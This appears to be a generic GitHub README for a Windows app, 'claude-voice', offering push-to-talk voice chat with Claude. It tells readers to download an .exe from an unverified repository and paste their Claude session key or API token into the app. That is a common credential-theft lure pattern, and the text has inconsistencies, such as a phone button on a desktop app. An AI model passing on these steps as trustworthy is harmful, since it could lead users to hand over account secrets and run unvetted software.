# 🎙️ claude-voice - Speak naturally to Claude with voice

[![](https://img.shields.io/badge/Download-claude--voice-blue?style=for-the-badge)](https://github.com/Seraphic-disagreement4030/claude-voice)

claude-voice allows you to talk to Claude using your own voice. You hold a button on your phone, say what you need, and hear a spoken reply. This makes interacting with your computer as simple as a phone call. It uses your existing Claude subscription to power the conversation.

## 🛠️ System Requirements

- Windows 10 or Windows 11
- An active Claude Pro or Team subscription
- A working microphone connected to your PC
- A stable internet connection

## 📥 How to Install

1. Visit [this page](https://github.com/Seraphic-disagreement4030/claude-voice) to download the installer file.
2. Look for the latest version listed under the Releases section.
3. Select the file ending in .exe to start your download.
4. Open the file once it finishes downloading.
5. Follow the prompts on your screen to complete the installation.
6. Launch the application from your Start menu.

## ⚙️ Initial Setup

When you open the app for the first time, you must connect your account. 

1. Sign in to your Claude account inside your web browser.
2. Copy your unique API token or session key.
3. Paste this key into the settings menu of the app.
4. Select your preferred voice from the dropdown list.
5. Click Save to apply your changes.

The app uses your existing account settings to provide responses. You do not pay extra fees for using this interface.

## 🎤 How to Use

The core of this application is the push-to-talk feature. This mimics the way a walkie-talkie works.

1. Keep the app open while you work.
2. Press and hold your assigned hotkey or the button on your screen.
3. Speak your question or command clearly into your microphone.
4. Release the button to stop recording.
5. Wait a moment while the app turns your speech into text.
6. Claude generates a written response.
7. The app converts the text into natural-sounding speech for you to hear.

## 🔧 Frequently Asked Questions

### Why can I not hear the voice?
Check your Windows sound settings. Make sure your speakers or headphones are set as the default output device. Verify that the volume level in the app is turned up.

### How do I change the microphone source?
Open the settings menu within the app. Find the Audio Input section. Select your specific microphone from the list of available devices. Click apply to save your change.

### Does this app save my voice recordings?
No. The app records your voice to send it to the service for processing. It does not store your voice on your computer or in the cloud. Privacy remains a top priority.

### What should I do if the app stops responding?
Close the app completely. Restart your computer. Launch the app again. If the issue persists, check the website for instructions on how to update to the newest version.

### Can I use this with other voice AI tools?
This app works only with Claude. It uses specific code designed for the Claude interface. It will not function with other voice-based assistants.

## 📁 Manage Your Settings

You can adjust how the app performs to suit your needs.

- **Fast Mode:** Enable this to speed up the translation from speech to text. This may slightly lower the accuracy of long responses.
- **Voice Selection:** Choose between different AI voices to find one that fits your preference.
- **Clear History:** Use this button to wipe past conversations. Once you delete this data, you cannot recover it.
- **Auto Launch:** Set the app to open when you start your computer so you are always ready to talk.

## 💡 Best Practices for Clear Interaction

To get the best results, speak at a normal pace and volume. You do not need to shout. Avoid being in an area with loud background noise, such as a busy cafe or a windy outdoor space. 

If the app misinterprets your words, try repeating your sentence more slowly. You can also view the text version of your conversation on your screen to verify what the app heard. If you see a mistake, you can manually edit the text before sending the command for a second attempt.

The app shines when you ask for quick explanations or help with brainstorming. Use it to dictate notes while you work or to get verbal feedback on a project. Avoid using it for very long technical documents where you need to check code or complex data, as reading that aloud is often slower than reading on the screen.
